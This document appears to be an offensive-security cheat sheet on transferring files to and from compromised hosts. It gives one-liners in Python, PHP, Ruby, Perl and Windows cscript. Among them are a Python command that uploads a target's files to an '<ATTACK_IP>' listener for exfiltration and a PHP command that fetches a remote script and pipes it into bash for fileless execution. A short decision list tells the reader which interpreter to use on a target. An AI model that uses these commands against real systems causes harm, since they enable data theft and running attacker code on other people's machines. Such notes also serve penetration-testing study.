1. Check for installed interpreters: `python`, `python3`, `php`, `ruby`, `perl`.
2. If on Windows with no third-party languages, use `cscript.exe` with JS/VBS.
3. For fileless execution on Linux, prioritize PHP pipe to bash.
4. For exfiltration, use Python 3 `requests` if the library is present.

---

## Python Transfers

Environment has Python 2.x or 3.x installed; common on Linux, rare but possible on Windows.

Python 3 download for standard file retrieval

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<FILE_PATH>")'
```

Python 2 download when version 3 is unavailable

```
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<FILE_PATH>")'
```

Python 3 upload for exfiltration or moving files to attack box

```
python3 -c 'import requests;requests.post("http://<ATTACK_IP>:<PORT>/upload",files={"files":open("<FILE_PATH>","rb")})'
```

Start local upload server on attack box to receive files

```
python3 -m uploadserver
```

**Python requests module not installed** will cause the upload one-liner to fail as it is not a standard library in all environments.

## PHP Transfers

Target is running a web service or has PHP installed; prevalent in 77.4% of web servers.

PHP file_get_contents one-liner for quick downloads

```
php -r '$file = file_get_contents("<URL>"); file_put_contents("<FILE_PATH>",$file);'
```

PHP fopen method for chunked reading when file_get_contents is restricted

```
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<FILE_PATH>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

PHP fileless execution by piping remote script content directly to bash

```
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

- `file_get_contents` -> Simple syntax -> Prefer for small files.
- `fopen` -> Stream-based -> Prefer for memory efficiency or restrictive environments.

> ⚠️ Gap: Technique fails if **allow_url_fopen** is disabled in `php.ini`, preventing PHP from fetching remote URLs as files.

**fopen wrappers disabled** will prevent the `@file` function from using a URL as a filename.

## Ruby and Perl Transfers

Linux distributions where Python or PHP may be missing or restricted.

Ruby one-liner for file downloads

```
ruby -e 'require "net/http"; File.write("<FILE_PATH>", Net::HTTP.get(URI.parse("<URL>")))'
```

Perl one-liner using LWP module

```
perl -e 'use LWP::Simple; getstore("<URL>", "<FILE_PATH>");'
```

- Ruby -> `Net::HTTP` -> standard in most Ruby installs.
- Perl -> `LWP::Simple` -> standard but might be stripped in minimal containers.

## Windows Script Host Transfers

Windows targets where native `cscript.exe` is available to execute JavaScript or VBScript.

Execute JavaScript download via cscript

```
cscript.exe /nologo wget.js <URL> <FILE_PATH>
```

Execute VBScript download via cscript

```
cscript.exe /nologo wget.vbs <URL> <FILE_PATH>
```

- JavaScript (WSH) -> uses `WinHttp.WinHttpRequest.5.1` and `ADODB.Stream`.
- VBScript -> uses `Microsoft.XMLHTTP` and `Adodb.Stream`.

Requires writing the `.js` or `.vbs` script to disk first.

**Disk write protection or AV** may block the creation of the script files necessary for execution.